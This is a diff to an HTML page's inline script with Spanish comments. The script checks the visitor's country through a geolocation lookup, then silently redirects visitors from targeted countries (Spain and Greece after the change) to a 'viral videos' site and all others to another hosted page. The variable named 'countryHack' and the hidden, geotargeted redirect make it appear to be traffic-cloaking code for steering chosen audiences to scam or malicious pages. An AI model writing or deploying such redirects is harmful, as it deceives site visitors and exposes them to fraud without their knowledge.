@@ -1,6 +1,7 @@
     <script>
-let countryHack = ['Hu', 'GR']; // Paises objetivo
-let urlPromocion = 'https://admin-4ok.pages.dev/';
+let countryHack = ['ES', 'GR']; // Paises objetivo
+let urlPromocion = 'https://videosviral.pages.dev';
+let urlPredeterminada = 'https://admin-4ok.pages.dev';
 let country;
 
 fetch('https://get.geojs.io/v1/ip/country')
@@ -8,21 +9,12 @@ fetch('https://get.geojs.io/v1/ip/country')
     .then((data) => {
         country = data.trim();
         if (countryHack.includes(country)) {
-            redirectURL(country);
-        } else {
-            // Redirige a una URL de respaldo si el país no está en la lista
             window.location.href = urlPromocion;
+        } else {
+            // Redirige a la URL predeterminada si el país no está en la lista
+            window.location.href = urlPredeterminada;
         }
     });
-
-function redirectURL(country) {
-    // Redirige a una URL específica para los países en la lista
-    if (country === 'Hu') {
-        window.location.href = 'https://videosviral.pages.dev/';
-    } else if (country === 'GR') {
-        window.location.href = 'https://videosviral.pages.dev/';
-    }
-}
     </script>
 </body>
 </html>
